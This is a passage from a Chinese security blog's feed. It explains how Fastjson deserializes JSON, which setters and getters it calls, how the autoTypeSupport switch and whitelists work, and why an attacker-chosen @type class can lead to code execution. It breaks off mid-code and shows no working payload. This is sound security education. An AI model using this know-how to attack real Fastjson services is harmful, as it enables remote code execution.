title="autoTypeSupport"></a>autoTypeSupport</h3><p>autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。</p><p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p><ul><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li></ul><p>AutoType白名单设置方法：</p><ol><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li><li>通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li></ol><hr><p>OK，Fastjson 1.2.22-1.2.24 反序列化漏洞分析到这，接下来一篇就写对各个补丁版本的checkAutoType()黑名单绕过。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson系列一——反序列化漏洞基本原理</title>
    <link href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/"/>
    <id>https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/</id>
    <published>2019-11-03T10:51:00.000Z</published>
    <updated>2019-11-06T15:14:33.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="Fastjson简介"><a href="#Fastjson简介" class="headerlink" title="Fastjson简介"></a>Fastjson简介</h3><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。</p><p>项目地址：<a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">https://github.com/alibaba/fastjson</a></p><h3 id="使用Fastjson进行序列化和反序列化"><a href="#使用Fastjson进行序列化和反序列化" class="headerlink" title="使用Fastjson进行序列化和反序列化"></a>使用Fastjson进行序列化和反序列化</h3><p>这里通过Demo了解下如何使用Fastjson进行序列化和反序列化，以及其中的一些特性之间的区别等等。</p><p>Student.java，定义的一个学生类，其中包含两个属性及其getter/setter方法，还有类的构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setAge"</span>);</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FJTest.java，调用JSON.toJsonString()来序列化Student类对象 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        Student student = <span class="keyword">new</span> Student();</span><br><span class="line">        student.setName(<span class="string">"Mi1k7ea"</span>);</span><br><span class="line">        student.setAge(<span class="number">6</span>);</span><br><span class="line">        String jsonstring = JSON.toJSONString(student, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(jsonstring);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SerializerFeature.WriteClassName，是JSON.toJSONString()中的一个设置属性值，设置之后在序列化的时候会多写入一个@type，即写上被序列化的类名，type可以指定反序列化的类，并且调用其getter/setter/is方法。</strong></p><p>Fastjson接受的JSON可以通过@type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作。</p><p>输出如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 设置了SerializerFeature.WriteClassName</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;@type&quot;:&quot;Student&quot;,&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span><br><span class="line"></span><br><span class="line">// 未设置SerializerFeature.WriteClassName</span><br><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">setAge</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">&#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Mi1k7ea&quot;&#125;</span><br></pre></td></tr></table></figure><p>FJTest2.java，调用JSON.parseObject()反序列化JSON为对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\"&#125;"</span>;</span><br><span class="line">        Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setAge</span><br><span class="line">setName</span><br><span class="line">Student@75b9fd80</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><h3 id="反序列化类图"><a href="#反序列化类图" class="headerlink" title="反序列化类图"></a>反序列化类图</h3><p>Fastjson反序列化的类方法调用关系如图：</p><p><img src="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/2.png" alt=""></p><p>JSON：门面类，提供入口 </p><p>DefaultJSONParser：主类 </p><p>ParserConfig：配置相关类 </p><p>JSONLexerBase：字符分析类 </p><p>JavaBeanDeserializer：JavaBean反序列化类</p><h3 id="Feature-SupportNonPublicField"><a href="#Feature-SupportNonPublicField" class="headerlink" title="Feature.SupportNonPublicField"></a>Feature.SupportNonPublicField</h3><p>如果需要还原出private属性的话，还需要在JSON.parseObject/JSON.parse中加上Feature.SupportNonPublicField参数。</p><p>这里改下Student类，将私有属性age的setAge()函数注释掉（一般没人会给私有属性加setter方法，加了就没必要声明为private了）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;</span></span><br><span class="line"><span class="comment">//        System.out.println("setAge");</span></span><br><span class="line"><span class="comment">//        this.age = age;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改FJTest2.java，去掉Feature.SupportNonPublicField，添加输出两个属性getter方法的返回值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\"&#125;"</span>;</span><br><span class="line">        Student obj = JSON.parseObject(jsonstring, Student.class);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">        System.out.println(obj.getName() + <span class="string">" "</span> + obj.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新运行，会看到获取不到私有变量age的值而是被设置为0：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@7addc524</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Mi1k7ea 0</span><br></pre></td></tr></table></figure><p>接着添加Feature.SupportNonPublicField：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure><p>再输出就能成功还原出age这个私有变量的值了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">Student@2c59109c</span><br><span class="line">Student</span><br><span class="line">getName</span><br><span class="line">getAge</span><br><span class="line">Mi1k7ea 6</span><br></pre></td></tr></table></figure><p>也就是说，若想让传给JSON.parseObject()进行反序列化的JSON内容指向的对象类中的私有变量成功还原出来，则需要在调用JSON.parseObject()时加上Feature.SupportNonPublicField这个属性设置才行。</p><h3 id="反序列化时几种类型设置的比较"><a href="#反序列化时几种类型设置的比较" class="headerlink" title="反序列化时几种类型设置的比较"></a>反序列化时几种类型设置的比较</h3><p>再来看下parseObject()的指定或不指定反序列化类型之间的差异。</p><p>由于Fastjson反序列化漏洞的利用只和包含了@type的JSON数据有关，因此这里我们只对序列化时设置了SerializerFeature.WriteClassName即含有@type指定反序列化类型的JSON数据进行反序列化；对于未包含@type的情况这里不做探讨，可自行测试。</p><p>修改Student类，添加两个private成员变量，且所有的私有成员变量都不定义setter方法（既然是private也没必要定义）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="keyword">private</span> Properties properties;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"构造函数"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getName"</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"setName"</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAge"</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAddress</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getAddress"</span>);</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Properties <span class="title">getProperties</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"getProperties"</span>);</span><br><span class="line">        <span class="keyword">return</span> properties;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="未设置Feature-SupportNonPublicField"><a href="#未设置Feature-SupportNonPublicField" class="headerlink" title="未设置Feature.SupportNonPublicField"></a>未设置Feature.SupportNonPublicField</h4><p>修改FJTest2.java，先是默认调用parseObject()不带指定类型的参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\",\"address\":\"china\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parseObject(jsonstring);</span><br><span class="line">        <span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line">        <span class="comment">//JSONObject obj = JSON.parseObject(jsonstring);</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出看到，调用了Student类的构造函数、所有属性的getter方法、JSON里面非私有属性的setter方法，其中getProperties()调用了两次；无论定义的对象是Object还是JSONObject，最后反序列化得到的都是JSONObject类对象，可以看到是未反序列化成功的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">getAddress</span><br><span class="line">getAge</span><br><span class="line">getName</span><br><span class="line">getProperties</span><br><span class="line">&#123;&quot;name&quot;:&quot;Mi1k7ea&quot;,&quot;age&quot;:0&#125;</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure><p>接着在FJTest2.java中修改反序列化代码语句如下，加上指定反序列化得到的类型为Object.class或Student.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonstring, Object.class);</span><br><span class="line"><span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Object obj = JSON.parseObject(jsonstring, Student.class);</span></span><br><span class="line"><span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Student obj = JSON.parseObject(jsonstring, Student.class);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 另外，JSONObject类不支持这种写法</span></span><br></pre></td></tr></table></figure><p>输出看到，调用了Student类的构造函数、JSON里面非私有属性的setter方法、properties成员变量的的getter方法，反序列化得到的是Student类对象即反序列化成功，也就是说<strong>只要添加了指定的类这个参数，通过@type的作用parseObject()都会成功将JSON反序列化为@type指定的类</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">Student@ca140c2</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><h4 id="设置Feature-SupportNonPublicField"><a href="#设置Feature-SupportNonPublicField" class="headerlink" title="设置Feature.SupportNonPublicField"></a>设置Feature.SupportNonPublicField</h4><p>修改FJTest2.java中反序列化代码语句如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</span><br><span class="line"><span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Object obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span></span><br><span class="line"><span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//Student obj = JSON.parseObject(jsonstring, Student.class, Feature.SupportNonPublicField);</span></span><br></pre></td></tr></table></figure><p>输出，发现和未设置Feature.SupportNonPublicField的是一致的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">Student@4c00c0cf</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>根据前面的结果，有如下结论：</p><ul><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li><li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li><li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li></ul><p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter/getter方法进行调用：</strong></p><p>满足条件的setter：</p><ul><li>函数名长度大于4且以set开头</li><li>非静态函数</li><li>返回类型为void或当前类</li><li>参数个数为1个</li></ul><p>满足条件的getter：</p><ul><li>函数名长度大于等于4</li><li>非静态方法</li><li>以get开头且第4个字母为大写</li><li>无参数</li><li>返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong</li></ul><p>注意，除了getter方法和setter方法外，还有个is方法这里没有列举，可自行测试。</p><p>前面的properties私有属性，其类型为Properties，而Properties是继承于Hashtable，Hashtable是实现Map接口类的类，因此properties私有属性的getter方法时继承自Map，从而能够成功被Fastjson调用。</p><h3 id="parse与parseObject区别"><a href="#parse与parseObject区别" class="headerlink" title="parse与parseObject区别"></a>parse与parseObject区别</h3><p>前面的demo都是用parseObject()演示的，还没说到parse()。两者主要的区别就是parseObject()返回的是JSONObject而parse()返回的是实际类型的对象，当在没有对应类的定义的情况下，一般情况下都会使用JSON.parseObject()来获取数据。</p><blockquote><p>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法。</p></blockquote><p>也就是说，我们用parse()反序列化会直接得到特定的类，而无需像parseObject()一样返回的是JSONObject类型的对象、还可能需要去设置第二个参数指定返回特定的类。</p><p>修改FJTest2.java中的parseObject()为parse()：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FJTest2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String jsonstring =<span class="string">"&#123;\"@type\":\"Student\",\"age\":6,\"name\":\"Mi1k7ea\",\"address\":\"china\",\"properties\":&#123;&#125;&#125;"</span>;</span><br><span class="line">        Object obj = JSON.parse(jsonstring);</span><br><span class="line">        <span class="comment">// 或以下语句，输出结果一致</span></span><br><span class="line"><span class="comment">//        Object obj = JSON.parse(jsonstring, Feature.SupportNonPublicField);</span></span><br><span class="line">        System.out.println(obj);</span><br><span class="line">        System.out.println(obj.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">构造函数</span><br><span class="line">setName</span><br><span class="line">getProperties</span><br><span class="line">Student@398600d7</span><br><span class="line">Student</span><br></pre></td></tr></table></figure><h2 id="0x02-Fastjson反序列化漏洞原理"><a href="#0x02-Fastjson反序列化漏洞原理" class="headerlink" title="0x02 Fastjson反序列化漏洞原理"></a>0x02 Fastjson反序列化漏洞原理</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。</p><p>通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p><p><strong>那么如何才能够反序列化出恶意类呢？</strong></p><p>由前面demo知道，Fastjson使用parseObject()/parse()进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p><p><strong>接着，如何才能触发反序列化得到的恶意类中的恶意函数呢？</strong></p><p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、getter方法、setter方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、getter方法、setter方法中要存在漏洞才能触发。</p><p>我们到DefaultJSONParser.parseObject(Map object, Object fieldName)中看下，JSON中以@type形式传入的类的时候，调用deserializer.deserialize()处理该类，并去调用这个类的setter和getter方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings</span>(&#123; <span class="string">"unchecked"</span>, <span class="string">"rawtypes"</span> 